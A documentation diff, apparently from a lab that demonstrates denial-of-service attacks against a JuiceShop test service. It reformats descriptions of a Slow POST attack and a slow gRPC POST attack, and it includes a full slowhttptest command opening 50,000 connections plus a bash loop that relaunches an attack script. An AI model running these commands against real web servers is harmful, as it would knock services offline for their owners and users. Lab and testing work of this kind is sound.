@@ -44,7 +44,8 @@ HTTP/1 Flood Attack -- ``/scripts/http1flood.sh``
     
 Slow POST HTTP Attack (Slow Loris) -- ``/scripts/slow_post_http1.sh``
     - A type of attack that relies on the fact that the HTTP protocol, by design, requires requests to be completely received by the server before they are processed.
-    - Sends a legitimate POST header with a ``Content-Length`` header specifying the size of the message body.  Attacker sends the actual message body at a slow rate or not at all.
+    - Sends a legitimate POST header with a ``Content-Length`` header specifying the size of the message body.
+    - Attacker sends the actual message body at a slow rate or not at all.
     - Attacker then opens thousands of such connections exhausting the logical resources for concurrent connections rather than bandwidth or processing power, allowing the attacker to efficently take out a web server.
     - ``slowhttptest -c 50000 -B -g -o my_body_stats -l 600 -i 5 -r 1000 -s 8192 -u http://10.1.1.4:600/api/Feedbacks/ -x 10 -p 3``
     - 50k connections with 5 second delay in message body for 600 seconds, 1k connections per second, 8192 byte Content-Length header, 10 byte follow-up data, 3 second timeout for HTTP response on probe connection.  Sends delayed POST request in message body to /api/Feedbacks/ endpoint on JuiceShop service.
@@ -67,24 +68,25 @@ Slow POST gRPC Attack -- ``/scripts/slow_post_http2.sh``
     - This attack sends 100 streams of a POST request to /testing using gRPC
 
 .. code-block:: bash
+    :caption: slow_post_http2.sh
     #!/bin/bash
     function int_handler {
-    pkill -9 -e python
-    exit
+        pkill -9 -e python
+        exit
     }
 
     trap int_handler INT
 
-
     while true; do
-    python slow_post.py  > /dev/null 2>&1 &
-    sleep 20
-    pkill -9 -e python
-
+        python slow_post.py  > /dev/null 2>&1 &
+        sleep 20
+        pkill -9 -e python
     done
 
-.. code-block:: python
+Python script referenced by the shell script:
 
+.. code-block:: python
+    :caption: slow_post.py
     import ssl
     import socket
     from time import sleep
